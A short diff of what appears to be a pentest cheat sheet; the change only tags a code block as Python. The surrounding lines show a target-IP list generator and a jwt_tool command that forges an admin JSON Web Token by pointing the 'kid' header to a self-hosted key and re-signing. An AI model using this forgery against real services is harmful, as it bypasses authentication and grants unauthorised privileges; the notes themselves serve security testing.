@@ -248,7 +248,7 @@ for ip in $(seq 200 254); do echo 1.2.3.${ip}; done > target-ip.txt
 
 ## Sign JWT with own key - might need a webserver serving the private key
 
-```
+```python
 python3 jwt_tool.py [eyJ0eXAiOiJKV1QiLCJhbG..snip..] -I -hc kid -hv "http://<IP>/jwt.pub" -pc <admin_cap> -pv <1> -S rs256 -pr jwt.key
 ```
 
